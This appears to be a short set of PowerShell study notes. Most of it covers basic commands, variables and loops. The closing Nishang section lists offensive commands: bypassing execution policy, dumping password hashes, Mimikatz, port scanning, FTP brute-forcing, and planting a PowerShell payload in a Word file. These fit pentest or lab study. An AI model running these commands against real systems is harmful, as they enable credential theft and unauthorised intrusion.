# PowerShell

## Examples

### Commands

```powershell
Get-Verb  # List available verbs
(Get-Verb).count  # Get the count of command output
help push  # Get help on a specific verb
help pushd  # Get additional help from previous command output
hostname > direct.txt  # Redirect output to a file
dir >> direct.txt  # Append output to a file
type direct.txt  # Read out file to the console
cat direct.txt  # Another way to read out file to the console
Get-Process  # Get running processes
echo "Hello World"  # Send Hello World to the console
Write-Host "Hello World"  # Send Hello World to the console
```

### Variables

```powershell
$name = 'Erich'
$number = 42
$nlist = 1,3,5,7,11,13
($nlist).count
echo "The list is $nlist"    
```

### If Statements

```powershell
if ($nlist[1] -gt 0)
{
echo "Positive"
}
```

### Loops

```powershell
$i = 1
do {
$val = $nlist | Select-Object -Index $i
echo "Value is $val"
$i = $i + 1
} while ($i -le ($nlist).count)
```

```powershell
ForEach ($val in $nlists)
{ echo "Value is $val"
}
```

## Nishang

```powershell
# Pre-req
Set-ExecutionPolicy Unrestricted
gci c:\nishang\ -recurse | Unblock-File
Import-Module .\nishang.psm1
# Example commands
Get-Command -Module nishang
Get-Information > info.txt
Get-Help Invoke-Mimikatz -full
Get-Passhashes
Invoke-PortScan -startaddress 10.0.2.1 -endaddress 10.0.2.8 -ScanPort
Out-Word -Paload "powershell.exe -ExecutionPolicy Bypass -noprofile"
Invoke-BruteForce 10.0.2.8 -service FTP -userlist users.txt -passwordlist passes.txt -verbose -StopOnSuccess
Invoke-Prasadhak  # Requries API key from Virus Total
```
